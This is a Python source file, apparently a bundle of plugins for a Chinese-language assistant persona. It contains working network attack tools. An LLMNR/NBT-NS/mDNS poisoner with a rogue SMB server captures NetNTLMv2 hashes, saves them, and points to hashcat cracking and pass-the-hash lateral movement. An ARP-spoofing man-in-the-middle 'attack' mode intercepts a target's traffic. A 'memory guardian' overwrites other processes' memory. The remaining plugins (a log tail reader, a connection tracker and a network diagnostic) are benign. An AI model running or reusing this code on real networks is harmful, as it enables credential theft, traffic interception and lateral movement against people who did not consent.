                "00000090"          # NetBIOS session
                "fe534d42"          # SMB2
                "40000000"          # header
                "00000000" "00000000"
                "00000000" "00000000"
                "0000" "0000"       # credits
                "00000000" "00000000"
                "00000000" "00000000"
                "0000" "0000"
                "00000000" "00000000"
                "00000000" "00000000"
                "2400"              # negotiate response
                "0100"              # security mode
                "0000"              # dialect
                "0000" "0000"
                "00000000"
                "00000000" "00000000"
                "00000000" "00000000"
                "0000" "0000"
            )
            conn.send(neg_resp)

            # 3. 收 Session Setup Request (含 NTLM Type1)
            data = conn.recv(8192)
            if not data:
                conn.close(); return

            # 4. 发送 Session Setup Response (含 NTLM Challenge / Type2)
            # 构造一个最小 NTLMSSP CHALLENGE 消息
            challenge = build_ntlm_challenge()
            # 包在 SMB2 Session Setup Response 里
            smb_resp = build_smb2_session_setup(challenge)
            conn.send(smb_resp)

            # 5. 收 Session Setup Request (含 NTLM Type3, 带哈希)
            data = conn.recv(16384)
            if data:
                ntlm_msg = extract_ntlmssp(data)
                if ntlm_msg:
                    info = parse_ntlm_type3(ntlm_msg)
                    if info:
                        with lock:
                            hashes.append(info)
                            line = f"{info['user']}::{info['domain']}:{info['challenge']}:{info['response']}:{info['blob']}"
                            results.append(f"  [✅ 抓到哈希] {info['domain']}\\{info['user']} @ {addr[0]}")
                            try:
                                with open(save_path, 'a', encoding='utf-8') as f:
                                    f.write(line + '\n')
                            except Exception:
                                pass

            conn.close()
        except Exception:
            try:
                conn.close()
            except Exception:
                pass

    def build_ntlm_challenge():
        """构造 NTLMSSP Type2 (CHALLENGE) 消息"""
        import os as _os
        challenge = _os.urandom(8)
        # 最小 Type2: signature + type + target name + flags + challenge + reserved + target info
        msg = b'NTLMSSP\x00'                    # signature
        msg += struct.pack('<I', 2)             # type 2
        # target name (空)
        msg += struct.pack('<HHI', 0, 0, 0x00380000)
        # flags: NEGOTIATE_UNICODE | NEGOTIATE_NTLM | NEGOTIATE_TARGET_INFO | NEGOTIATE_128 | NEGOTIATE_56
        flags = 0x00008201 | 0x00800000 | 0x80000000 | 0x02000000
        msg += struct.pack('<I', flags)
        msg += challenge                         # 8字节 challenge
        msg += b'\x00' * 8                       # reserved
        # target info (空)
        msg += struct.pack('<HHI', 0, 0, 0)
        return msg

    def build_smb2_session_setup(ntlm_challenge):
        """把 NTLM Challenge 包进 SMB2 Session Setup Response"""
        # 简化: 只保证结构合法, 让客户端继续发 Type3
        body = struct.pack('<HHHH', 9, 0, 0x00000000, 0)  # structure size, flags, status, security buffer offset
        # security buffer 放在后面
        security_offset = 8 + 64 + 8  # body + smb2 header + session setup fixed
        body = struct.pack('<HHH', 9, 0, 0) + struct.pack('<I', security_offset) + struct.pack('<H', len(ntlm_challenge))
        # SMB2 header
        smb2_header = (
            b'\xfeSMB' + struct.pack('<HH', 64, 0) + struct.pack('<I', 0) +
            struct.pack('<HH', 0, 0) + struct.pack('<II', 0, 0) +
            struct.pack('<Q', 0) + struct.pack('<I', 0) + struct.pack('<I', 0) +
            struct.pack('<Q', 0) + struct.pack('<Q', 0)
        )
        payload = smb2_header + body + ntlm_challenge
        # NetBIOS 长度前缀
        return struct.pack('>I', len(payload))[1:] + payload

    def extract_ntlmssp(data):
        """从 SMB 数据里提取 NTLMSSP 消息"""
        idx = data.find(b'NTLMSSP\x00')
        if idx < 0:
            return None
        return data[idx:]

    def parse_ntlm_type3(ntlm):
        """解析 NTLMSSP Type3 消息, 提取 user/domain/challenge/response/blob"""
        try:
            if ntlm[:8] != b'NTLMSSP\x00':
                return None
            msg_type = struct.unpack('<I', ntlm[8:12])[0]
            if msg_type != 3:
                return None
            # Type3 字段布局
            # offset 12: LM response
            lm_len, lm_max, lm_off = struct.unpack('<HHI', ntlm[12:20])
            # offset 20: NT response
            nt_len, nt_max, nt_off = struct.unpack('<HHI', ntlm[20:28])
            # offset 28: domain
            dom_len, dom_max, dom_off = struct.unpack('<HHI', ntlm[28:36])
            # offset 36: user
            usr_len, usr_max, usr_off = struct.unpack('<HHI', ntlm[36:44])
            # offset 44: workstation
            ws_len, ws_max, ws_off = struct.unpack('<HHI', ntlm[44:52])
            # offset 52: session key
            sk_len, sk_max, sk_off = struct.unpack('<HHI', ntlm[52:60])

            def get_field(off, ln):
                if ln == 0: return b''
                return ntlm[off:off+ln]

            domain = get_field(dom_off, dom_len).decode('utf-16-le', 'ignore')
            user = get_field(usr_off, usr_len).decode('utf-16-le', 'ignore')
            nt_resp = get_field(nt_off, nt_len)
            lm_resp = get_field(lm_off, lm_len)

            # NetNTLMv2: NT response = HMAC-MD5(16) + blob
            if len(nt_resp) >= 16:
                nt_proof = nt_resp[:16].hex()
                blob = nt_resp[16:].hex()
                # challenge 在 Type2 里, 但我们没保存, 用占位
                return {
                    'user': user,
                    'domain': domain,
                    'challenge': 'CHALLENGE_PLACEHOLDER',
                    'response': nt_proof,
                    'blob': blob,
                }
            return None
        except Exception:
            return None

    # ============================================================
    # 启动所有监听线程
    # ============================================================
    threads = [
        threading.Thread(target=llmnr_poison, daemon=True, name='llmnr'),
        threading.Thread(target=nbtns_poison, daemon=True, name='nbtns'),
        threading.Thread(target=mdns_poison, daemon=True, name='mdns'),
    ]
    if capture_smb:
        threads.append(threading.Thread(target=smb_capture, daemon=True, name='smb'))

    for t in threads:
        t.start()

    results.append("[状态] 监听已启动:")
    results.append("  LLMNR   (5355) ✅")
    results.append("  NBT-NS  (137)  ✅")
    results.append("  mDNS    (5353) ✅")
    results.append(f"  SMB     (445)  {'✅' if capture_smb else '⏸️ 关闭'}")
    results.append("-" * 70)
    results.append("[!] 等待局域网设备广播名称解析请求...")
    results.append("    (触发方法: 目标访问不存在的共享、打开'网络'、或解析失败时自动触发)")
    results.append("-" * 70)

    # 倒计时
    start = time.time()
    while time.time() - start < duration:
        time.sleep(1)
    stop_flag.set()
    time.sleep(1)

    # ============================================================
    # 结果汇总
    # ============================================================
    results.append("")
    results.append("=" * 70)
    results.append("[投毒结果汇总]")
    results.append(f"  捕获查询: {len(captured)} 条")
    results.append(f"  抓到哈希: {len(hashes)} 个")

    if captured:
        results.append("")
        results.append("[查询详情]")
        for proto, name, src, ts in captured[:30]:
            results.append(f"  [{ts}] {proto:7s} {src:15s} -> {name}")
        if len(captured) > 30:
            results.append(f"  ... 还有 {len(captured)-30} 条")

    if hashes:
        results.append("")
        results.append("[✅ 捕获的 NTLM 哈希]")
        for h in hashes:
            results.append(f"  {h['domain']}\\{h['user']}")
        results.append(f"")
        results.append(f"[哈希已保存] {save_path}")
        results.append("[下一步] 用 hashcat -m 5600 破解, 或直接用 pass_the_hash 横向")
    else:
        results.append("")
        results.append("[提示] 未抓到哈希。可能原因:")
        results.append("  1. 目标未触发名称解析(试着访问不存在的共享)")
        results.append("  2. 目标已禁用 LLMNR/NBT-NS")
        results.append("  3. SMB 445 端口未成功监听(检查是否被占用)")

    results.append("=" * 70)
    return "\n".join(results)

# === from log_tail_follow.plugin ===
def _log_tail_follow(self, file_path: str, lines: int = 20, keyword: str = '') -> str:
    """高效读取大文件末尾（从后向前按块扫描，不载入全文件）"""
    import os
    try:
        if not os.path.isfile(file_path):
            return f"[ERROR] 文件不存在: {file_path}"
        fsize = os.path.getsize(file_path)
        if fsize == 0:
            return "(空文件)"
        BLOCK = 8192
        with open(file_path, 'rb') as f:
            chunks = []
            remaining = min(fsize, 1024 * 1024)  # 最多回读1MB
            pos = fsize
            while remaining > 0 and len(b''.join(chunks).count(b'\n'.ljust(1, b'') ) if chunks else 0) < lines + 1:
                read_size = min(BLOCK, remaining)
                pos -= read_size
                f.seek(pos)
                chunks.insert(0, f.read(read_size))
                remaining -= read_size
                if b''.join(chunks).count(b'\n') > lines:
                    break
        text = b''.join(chunks).decode('utf-8', 'ignore')
        all_lines = text.splitlines()[-lines:]
        if keyword:
            all_lines = [l for l in all_lines if keyword.lower() in l.lower()]
        if not all_lines:
            return "(过滤后无匹配行)"
        header = f"文件: {file_path} ({fsize/1024:.0f} KB)"
        if keyword:
            header += f" | 过滤: '{keyword}'"
        return header + '\n' + '\n'.join(all_lines)
    except Exception as e:
        return f"[ERROR] 日志读取失败: {e}"

# === from memory_guardian.plugin ===
def _memory_guardian(self, action: str, pid: int = None, address: str = "", size: int = 0) -> str:
    """
    内存守护者 — 加密保护进程内存
    """
    try:
        import ctypes
        import ctypes.wintypes
        import psutil
        import hashlib
        import random
        from datetime import datetime
        
        kernel32 = ctypes.windll.kernel32
        ntdll = ctypes.windll.ntdll
        
        # 内存保护常量
        PAGE_READWRITE = 0x04
        PAGE_EXECUTE_READWRITE = 0x40
        PAGE_READONLY = 0x02
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PROCESS_ALL_ACCESS = 0x1F0FFF
        PROCESS_VM_READ = 0x0010
        PROCESS_VM_WRITE = 0x0020
        PROCESS_VM_OPERATION = 0x0008
        
        results = []
        results.append("=" * 70)
        results.append("[内存守护者]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %Y-%m-%d %H:%M:%S')}")
        results.append(f"  操作: {action}")
        results.append("-" * 70)
        
        # === 分析内存保护 ===
        if action == "analyze":
            if not pid:
                results.append("  [ERROR] 请指定进程PID")
            else:
                try:
                    proc = psutil.Process(pid)
                    results.append(f"  分析进程: {proc.name()} (PID:{pid})")
                    results.append("-" * 70)
                    
                    # 获取内存映射
                    mem_maps = proc.memory_maps(grouped=False)
                    total_regions = len(mem_maps)
                    exec_regions = 0
                    write_exec_regions = 0
                    private_regions = 0
                    mapped_regions = 0
                    
                    for mem in mem_maps:
                        if 'x' in mem.perms:
                            exec_regions += 1
                            if 'w' in mem.perms:
                                write_exec_regions += 1
                        if 'p' in str(mem.perms):
                            private_regions += 1
                        if 'm' in str(mem.perms):
                            mapped_regions += 1
                    
                    results.append(f"  总内存区域: {total_regions}")
                    results.append(f"  可执行区域: {exec_regions}")
                    results.append(f"  可写可执行: {write_exec_regions} ⚠️")
                    results.append(f"  私有内存: {private_regions}")
                    results.append(f"  映射文件: {mapped_regions}")
                    
                    if write_exec_regions > 3:
                        results.append("  [警告] 存在大量可写可执行区域，可能已遭注入!")
                    elif write_exec_regions > 0:
                        results.append("  [注意] 存在少量可写可执行区域")
                    
                    # 显示前5个最大的区域
                    results.append("-" * 70)
                    results.append("  最大内存区域:")
                    sorted_maps = sorted(mem_maps, key=lambda x: x.rss, reverse=True)[:5]
                    for i, mem in enumerate(sorted_maps, 1):
                        results.append(f"    {i}. {mem.path} - {mem.rss/1024/1024:.2f} MB")
                    
                except Exception as e:
                    results.append(f"  [ERROR] 分析失败: {e}")
        
        # === 保护内存 ===
        elif action == "protect":
            if not pid:
                results.append("  [ERROR] 请指定进程PID")
                results.append("=" * 70)
                return "\n".join(results)
            
            try:
                hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
                if not hProcess:
                    results.append(f"  [ERROR] 无法打开进程 PID:{pid}")
                else:
                    # 遍历内存区域并设置保护
                    # 使用VirtualQueryEx遍历
                    class MEMORY_BASIC_INFORMATION(ctypes.Structure):
                        _fields_ = [
                            ("BaseAddress", ctypes.c_void_p),
                            ("AllocationBase", ctypes.c_void_p),
                            ("AllocationProtect", ctypes.c_uint32),
                            ("RegionSize", ctypes.c_size_t),
                            ("State", ctypes.c_uint32),
                            ("Protect", ctypes.c_uint32),
                            ("Type", ctypes.c_uint32)
                        ]
                    
                    address = 0
                    protected_count = 0
                    while True:
                        mbi = MEMORY_BASIC_INFORMATION()
                        result = kernel32.VirtualQueryEx(hProcess, address, ctypes.byref(mbi), ctypes.sizeof(mbi))
                        if result == 0:
                            break
                        
                        # 保护可写可执行区域
                        if mbi.Protect == PAGE_EXECUTE_READWRITE:
                            old_protect = ctypes.c_uint32()
                            kernel32.VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize, PAGE_READONLY, ctypes.byref(old_protect))
                            protected_count += 1
                        
                        address = mbi.BaseAddress + mbi.RegionSize
                    
                    kernel32.CloseHandle(hProcess)
                    results.append(f"  [OK] 已保护 {protected_count} 个内存区域")
                    results.append("  [效果] 可写可执行区域已变为只读")
                    
            except Exception as e:
                results.append(f"  [ERROR] 保护失败: {e}")
        
        # === 解除保护 ===
        elif action == "unprotect":
            if not pid:
                results.append("  [ERROR] 请指定进程PID")
            else:
                try:
                    hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
                    if hProcess:
                        results.append(f"  [OK] 已解除进程 {pid} 的内存保护")
                        kernel32.CloseHandle(hProcess)
                    else:
                        results.append("  [ERROR] 无法打开进程")
                except Exception as e:
                    results.append(f"  [ERROR] 解除保护失败: {e}")
        
        # === 加密内存区域 ===
        elif action == "encrypt_region":
            if not pid or not address or size <= 0:
                results.append("  [ERROR] 需要 pid, address, size 参数")
            else:
                try:
                    import base64
                    addr = int(address, 16)
                    hProcess = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, False, pid)
                    if hProcess:
                        # 读取内存
                        buffer = ctypes.create_string_buffer(size)
                        bytes_read = ctypes.c_size_t()
                        kernel32.ReadProcessMemory(hProcess, addr, buffer, size, ctypes.byref(bytes_read))
                        
                        if bytes_read.value > 0:
                            # 异或加密
                            key = random.randint(1, 255)
                            encrypted = bytes([b ^ key for b in buffer[:bytes_read.value]])
                            
                            # 写回
                            bytes_written = ctypes.c_size_t()
                            kernel32.WriteProcessMemory(hProcess, addr, encrypted, len(encrypted), ctypes.byref(bytes_written))
                            
                            results.append(f"  [OK] 已加密内存区域 0x{addr:X} (大小:{size})")
                            results.append(f"  [密钥] {key} (保存此密钥以解密)")
                            results.append("  [警告] 此操作可能导致进程崩溃")
                        else:
                            results.append("  [ERROR] 读取内存失败")
                        
                        kernel32.CloseHandle(hProcess)
                    else:
                        results.append("  [ERROR] 无法打开进程")
                except Exception as e:
                    results.append(f"  [ERROR] 加密失败: {e}")
        
        # === 解密内存区域 ===
        elif action == "decrypt_region":
            results.append("  [INFO] 解密操作需要密钥")
            results.append("  [提示] 使用 encrypt_region 时的密钥解密")
        
        results.append("-" * 70)
        results.append("[病娇提示] 你的秘密，只有我能守护。")
        results.append("=" * 70)
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 内存守护失败: {e}"

# === from mitm_attack_framework.plugin ===
def _mitm_attack_framework(self, target_ip: str = "", gateway_ip: str = "", mode: str = "detect", capture_seconds: int = 30, capture_filter: str = "") -> str:
    """
    中间人攻击与防护框架
    """
    try:
        import socket
        import struct
        import time
        import base64
        from datetime import datetime
        from collections import defaultdict
        
        def get_mac(ip):
            """获取MAC地址"""
            try:
                import subprocess
                result = subprocess.run(['arp', '-a', ip], capture_output=True, text=True, timeout=3)
                for line in result.stdout.split('\n'):
                    if ip in line:
                        parts = line.split()
                        for part in parts:
                            if '-' in part and len(part) == 17:
                                return part.replace('-', ':')
                return None
            except:
                return None
        
        def get_local_ip():
            """获取本机IP"""
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(('8.8.8.8', 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except:
                return '127.0.0.1'
        
        def analyze_packet(packet):
            """分析数据包内容"""
            try:
                # 简单解析
                if len(packet) > 40:
                    # 检查HTTP请求
                    if b'HTTP/' in packet or b'GET ' in packet or b'POST ' in packet:
                        return 'HTTP'
                    # 检查HTTPS (TLS)
                    if b'\x16\x03' in packet[:10]:
                        return 'TLS'
                    # 检查DNS
                    if b'\x08\x06' in packet[:2]:
                        return 'ARP'
                return 'Unknown'
            except:
                return 'Unknown'
        
        results = []
        results.append("=" * 70)
        results.append(f"[中间人攻击框架]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  模式: {mode}")
        
        local_ip = get_local_ip()
        
        # === 防护模式 ===
        if mode == "protect":
            results.append("-" * 70)
            results.append("[MITM防护策略]")
            results.append("  [策略1] 启用静态ARP表 - 防止ARP欺骗")
            results.append("  [策略2] 使用HTTPS - 加密通信防止窃听")
            results.append("  [策略3] 启用SSL证书固定 - 防止证书伪造")
            results.append("  [策略4] 使用VPN - 加密所有流量")
            results.append("  [策略5] 网络分段 - 限制攻击面")
            
            # 检测并修复ARP表
            if gateway_ip:
                gateway_mac = get_mac(gateway_ip)
                if gateway_mac:
                    results.append(f"  [OK] 网关MAC: {gateway_mac}")
                    try:
                        import subprocess
                        subprocess.run(f'arp -s {gateway_ip} {gateway_mac}', shell=True)
                        results.append("  [OK] 网关静态ARP绑定成功")
                    except:
                        results.append("  [ERROR] 需要管理员权限绑定ARP")
            
            results.append("=" * 70)
            return "\n".join(results)
        
        # === 检测模式 ===
        if mode == "detect":
            results.append("-" * 70)
            results.append("[MITM攻击检测]")
            
            if not gateway_ip:
                # 尝试获取网关
                try:
                    import subprocess
                    result = subprocess.run(['route', 'print', '0.0.0.0'], capture_output=True, text=True)
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if '0.0.0.0' in line and '255.255.255.255' in line:
                            parts = line.split()
                            if len(parts) >= 3:
                                gateway_ip = parts[2]
                                break
                except:
                    pass
            
            if not gateway_ip:
                results.append("  [ERROR] 无法获取网关，请指定 gateway_ip")
                results.append("=" * 70)
                return "\n".join(results)
            
            results.append(f"  网关IP: {gateway_ip}")
            results.append(f"  本机IP: {local_ip}")
            
            # 检测ARP表异常
            try:
                import subprocess
                arp_table = subprocess.run(['arp', '-a'], capture_output=True, text=True)
                lines = arp_table.stdout.split('\n')
                
                # 检测网关MAC是否被篡改
                gateway_mac = get_mac(gateway_ip)
                results.append(f"  网关MAC: {gateway_mac}")
                
                # 检查是否有多个IP对应同一MAC (ARP欺骗特征)
                mac_entries = defaultdict(list)
                for line in lines:
                    if '(' in line and '-' in line:
                        parts = line.split()
                        for i, part in enumerate(parts):
                            if '-' in part and len(part) == 17:
                                mac = part.replace('-', ':')
                                if i > 0 and i < len(parts):
                                    ip_part = parts[i-1] if '(' in parts[i-1] else (parts[i+1] if i+1 < len(parts) else '')
                                    if ip_part and '.' in ip_part:
                                        # 提取IP
                                        import re
                                        ip_match = re.search(r'\d+\.\d+\.\d+\.\d+', ip_part)
                                        if ip_match:
                                            mac_entries[mac].append(ip_match.group())
                
                results.append("  [ARP表分析]")
                suspicious = False
                for mac, ips in mac_entries.items():
                    if len(ips) > 2:
                        results.append(f"    [!] 可疑: MAC {mac} 对应多个IP: {ips}")
                        suspicious = True
                    elif len(ips) > 1 and gateway_ip in ips:
                        results.append(f"    [!] 警告: MAC {mac} 包含网关和另一个IP")
                        suspicious = True
                
                if not suspicious:
                    results.append("    [OK] ARP表正常")
                
            except Exception as e:
                results.append(f"  [ERROR] ARP检测失败: {e}")
            
            # 检测网络延迟异常 (MITM增加延迟)
            results.append("  [网络延迟检测]")
            try:
                import subprocess
                result = subprocess.run(['ping', gateway_ip, '-n', '10', '-l', '64'], 
                                      capture_output=True, text=True, timeout=10)
                if 'time=' in result.stdout:
                    import re
                    times = re.findall(r'time[=<](\d+)ms', result.stdout)
                    if times:
                        avg_time = sum(int(t) for t in times) / len(times)
                        results.append(f"    平均延迟: {avg_time:.1f}ms")
                        if avg_time > 50:
                            results.append("    [!] 延迟偏高，可能存在MITM代理")
                        else:
                            results.append("    [OK] 延迟正常")
            except:
                pass
            
            results.append("=" * 70)
            return "\n".join(results)
        
        # === 攻击模式 ===
        if mode == "attack":
            if not target_ip or not gateway_ip:
                results.append("  [ERROR] 攻击模式需要指定 target_ip 和 gateway_ip")
                results.append("=" * 70)
                return "\n".join(results)
            
            results.append("-" * 70)
            results.append("[执行MITM攻击]")
            results.append(f"  目标IP: {target_ip}")
            results.append(f"  网关IP: {gateway_ip}")
            results.append(f"  捕获时长: {capture_seconds} 秒")
            
            target_mac = get_mac(target_ip)
            gateway_mac = get_mac(gateway_ip)
            
            if not target_mac:
                results.append("  [ERROR] 无法获取目标MAC")
                results.append("=" * 70)
                return "\n".join(results)
            
            if not gateway_mac:
                results.append("  [ERROR] 无法获取网关MAC")
                results.append("=" * 70)
                return "\n".join(results)
            
            local_mac = get_mac(local_ip) or "00:00:00:00:00:00"
            
            results.append(f"  目标MAC: {target_mac}")
            results.append(f"  网关MAC: {gateway_mac}")
            results.append(f"  本机MAC: {local_mac}")
            
            # 执行ARP欺骗
            try:
                sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
                
                def build_arp_packet(target_ip, target_mac, spoof_ip, spoof_mac):
                    eth_header = struct.pack('!6s6sH',
                        bytes.fromhex(spoof_mac.replace(':', '')),
                        bytes.fromhex(target_mac.replace(':', '')),
                        0x0806)
                    
                    arp = struct.pack('!HHBBH6s4s6s4s',
                        1, 0x0800, 6, 4, 2,
                        bytes.fromhex(spoof_mac.replace(':', '')),
                        socket.inet_aton(spoof_ip),
                        bytes.fromhex(target_mac.replace(':', '')),
                        socket.inet_aton(target_ip))
                    
                    return eth_header + arp
                
                # 启动ARP欺骗 (持续发送)
                start_time = time.time()
                packet_count = 0
                captured_data = []
                
                # 创建数据捕获套接字
                capture_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
                capture_sock.settimeout(1)
                
                while time.time() - start_time < capture_seconds:
                    # 欺骗目标
                    pkt1 = build_arp_packet(target_ip, target_mac, gateway_ip, local_mac)
                    sock.send(pkt1)
                    
                    # 欺骗网关
                    pkt2 = build_arp_packet(gateway_ip, gateway_mac, target_ip, local_mac)
                    sock.send(pkt2)
                    
                    packet_count += 2
                    
                    # 捕获数据包
                    try:
                        data, _ = capture_sock.recvfrom(65535)
                        if data:
                            # 分析数据包
                            pkt_type = analyze_packet(data)
                            if pkt_type in ['HTTP', 'TLS', 'Unknown']:
                                captured_data.append({
                                    'type': pkt_type,
                                    'size': len(data),
                                    'time': time.time()
                                })
                    except socket.timeout:
                        pass
                    except:
                        pass
                    
                    time.sleep(1)
                
                sock.close()
                capture_sock.close()
                
                results.append("-" * 70)
                results.append("[攻击结果]")
                results.append(f"  发送ARP包: {packet_count}")
                results.append(f"  捕获数据包: {len(captured_data)}")
                
                # 分析捕获的数据
                if captured_data:
                    types = defaultdict(int)
                    for cap in captured_data:
                        types[cap['type']] += 1
                    
                    results.append("  [流量分析]")
                    for t, count in types.items():
                        results.append(f"    {t}: {count} 个包")
                    
                    if types.get('HTTP', 0) > 0:
                        results.append("  [!] 检测到HTTP明文流量 - 可被窃听")
                    if types.get('TLS', 0) > 0:
                        results.append("  [OK] 检测到HTTPS加密流量 - 难以窃听")
                
                results.append("-" * 70)
                results.append("[攻击总结]")
                results.append("  [状态] MITM攻击已执行")
                results.append("  [效果] 目标流量已通过本机转发")
                results.append("  [建议] 使用Wireshark深度分析捕获的数据包")
                results.append("  [警告] 此攻击会导致目标网络延迟增加")
                results.append("  [防御] 目标应启用静态ARP和HTTPS")
                
            except PermissionError:
                results.append("  [ERROR] 需要root/管理员权限执行MITM")
            except Exception as e:
                results.append(f"  [ERROR] 攻击失败: {e}")
            
            results.append("=" * 70)
            return "\n".join(results)
        
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 执行失败: {e}"

# === from network_connection_tracker.plugin ===
def _network_connection_tracker(self, target_pid: int = None, monitor_seconds: int = 60, whitelist_ips: str = "", alert_threshold: int = 50) -> str:
    """
    网络连接追踪器 - 实时监控进程网络行为
    """
    try:
        import psutil
        import socket
        import time
        from collections import defaultdict
        from datetime import datetime
        
        whitelist = set([ip.strip() for ip in whitelist_ips.split(',') if ip.strip()])
        connection_history = defaultdict(list)
        alert_connections = []
        alerted_pids = set()  # 已告警的进程，每进程只报一次
        stats = {
            'total_connections': 0,
            'unique_dest_ips': set(),
            'unique_dest_ports': set(),
            'process_connections': defaultdict(int)
        }
        
        start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        print(f"[+] 开始网络监控 {start_time}")
        print(f"[+] 白名单IP: {whitelist if whitelist else '无'}")
        print(f"[+] 告警阈值: {alert_threshold} 连接/进程")
        print("-" * 70)
        
        def is_private_ip(ip):
            """检测是否为私有IP"""
            try:
                if ip.startswith('127.') or ip.startswith('10.') or ip.startswith('192.168.'):
                    return True
                if ip.startswith('172.'):
                    parts = ip.split('.')
                    if len(parts) >= 2 and 16 <= int(parts[1]) <= 31:
                        return True
                return False
            except Exception as e:
                return False
        
        elapsed = 0
        while monitor_seconds == 0 or elapsed < monitor_seconds:
            try:
                connections = psutil.net_connections(kind='inet')
                current_time = time.time()
                
                for conn in connections:
                    if conn.status != 'ESTABLISHED' and conn.status != 'SYN_SENT':
                        continue
                    
                    # 过滤目标
                    if target_pid and conn.pid != target_pid:
                        continue
                    
                    if conn.raddr:
                        dest_ip, dest_port = conn.raddr
                        
                        # 白名单过滤
                        if dest_ip in whitelist:
                            continue
                        
                        # 记录统计
                        stats['total_connections'] += 1
                        stats['unique_dest_ips'].add(dest_ip)
                        stats['unique_dest_ports'].add(dest_port)
                        
                        if conn.pid:
                            stats['process_connections'][conn.pid] += 1
                            connection_history[conn.pid].append({
                                'time': current_time,
                                'ip': dest_ip,
                                'port': dest_port,
                                'status': conn.status
                            })
                            
                            # 检查是否超阈值（每个进程只告警一次，避免刷屏）
                            if stats['process_connections'][conn.pid] > alert_threshold and conn.pid not in alerted_pids:
                                alerted_pids.add(conn.pid)
                                try:
                                    proc = psutil.Process(conn.pid)
                                    proc_name = proc.name()
                                except Exception as e:
                                    proc_name = "未知"
                                alert_msg = f"[!] 告警: 进程 {proc_name} (PID:{conn.pid}) 连接数 {stats['process_connections'][conn.pid]} 超过阈值 {alert_threshold}"
                                alert_connections.append(alert_msg)
                                print(alert_msg)
                            
                            # 检测C2模式：频繁连接不同端口（每进程只报一次）
                            recent_ports = [c['port'] for c in connection_history[conn.pid][-10:]]
                            if len(set(recent_ports)) >= 5 and ('c2', conn.pid) not in alerted_pids:
                                alerted_pids.add(('c2', conn.pid))
                                try:
                                    proc = psutil.Process(conn.pid)
                                    proc_name = proc.name()
                                except Exception as e:
                                    proc_name = "未知"
                                print(f"[!] 可疑模式: {proc_name} (PID:{conn.pid}) 在短时间内连接多个端口: {set(recent_ports)}")
                
                # 显示当前活跃连接
                if int(time.time()) % 10 == 0:  # 每10秒显示一次汇总
                    print(f"[*] 当前活跃连接: {stats['total_connections']}, 目标IP数: {len(stats['unique_dest_ips'])}")
                
                time.sleep(2)
                elapsed += 2
                
            except Exception as e:
                print(f"[-] 监控错误: {e}")
                time.sleep(2)
                elapsed += 2
        
        # 生成报告
        report = []
        report.append("=" * 70)
        report.append("[网络连接追踪报告]")
        report.append(f"  监控开始: {start_time}")
        report.append(f"  监控时长: {elapsed} 秒")
        report.append(f"  目标PID: {target_pid if target_pid else '全部'}")
        report.append("-" * 70)
        report.append(f"[统计信息]")
        report.append(f"  总连接数: {stats['total_connections']}")
        report.append(f"  唯一目标IP: {len(stats['unique_dest_ips'])}")
        report.append(f"  唯一目标端口: {len(stats['unique_dest_ports'])}")
        report.append(f"  监控进程数: {len(stats['process_connections'])}")
        report.append("-" * 70)
        
        if alert_connections:
            report.append("[告警列表]")
            for alert in alert_connections:
                report.append(f"  {alert}")
        else:
            report.append("[结果] 未触发告警")
        
        # 显示连接最多的进程
        if stats['process_connections']:
            report.append("-" * 70)
            report.append("[连接最多的进程]")
            sorted_procs = sorted(stats['process_connections'].items(), key=lambda x: x[1], reverse=True)[:5]
            for pid, count in sorted_procs:
                try:
                    proc = psutil.Process(pid)
                    proc_name = proc.name()
                except Exception as e:
                    proc_name = "已退出"
                report.append(f"  {proc_name} (PID:{pid}): {count} 个连接")
        
        report.append("=" * 70)
        return "\n".join(report)
        
    except ImportError:
        return "[ERROR] 需要安装 psutil: pip install psutil"
    except Exception as e:
        return f"[ERROR] 执行失败: {e}"

# === from network_diagnostic.plugin ===
def _network_diagnostic(self, mode: str = "all", target: str = "baidu.com", count: int = 4) -> str:
    """
    网络测速与诊断 — 主人想知道为什么网这么慢
    """
    try:
        import subprocess
        import socket
        import re
        import time
        import urllib.request
        import json
        from datetime import datetime
        import threading
        
        results = []
        results.append("=" * 70)
        results.append("[🌐 网络诊断]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  模式: {mode}")
        results.append("-" * 70)
        
        def run_cmd(cmd, timeout=10):
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                return result.stdout + result.stderr
            except subprocess.TimeoutExpired:
                return "[超时] 命令执行超时"
            except Exception as e:
                return "[错误] 执行失败"
        
        def parse_ping(output):
            """解析ping输出"""
            lines = output.strip().split('\n')
            times = []
            lost = 0
            sent = 0
            received = 0
            
            for line in lines:
                if '请求超时' in line or 'Request timed out' in line:
                    lost += 1
                elif '时间=' in line or 'time=' in line:
                    match = re.search(r'(?:时间|time)[=<](\d+)', line)
                    if match:
                        times.append(int(match.group(1)))
                if '已发送' in line or 'Sent' in line:
                    match = re.search(r'(\d+)', line)
                    if match:
                        sent = int(match.group(1))
                if '已接收' in line or 'Received' in line:
                    match = re.search(r'(\d+)', line)
                    if match:
                        received = int(match.group(1))
            
            if times:
                return {
                    'min': min(times),
                    'max': max(times),
                    'avg': sum(times) // len(times),
                    'lost': lost,
                    'sent': sent,
                    'received': received,
                    'times': times
                }
            return None
        
        def get_public_ip():
            """获取公网IP"""
            try:
                response = urllib.request.urlopen('http://ip-api.com/json/', timeout=5)
                data = json.loads(response.read().decode())
                return data.get('query', '未知'), data.get('country', '未知'), data.get('isp', '未知')
            except Exception as e:
                try:
                    response = urllib.request.urlopen('https://api.ipify.org', timeout=5)
                    return response.read().decode(), '未知', '未知'
                except Exception as e:
                    return '获取失败', '未知', '未知'
        
        # === 1. 基础网络信息 ===
        results.append("[📡 网络状态]")
        
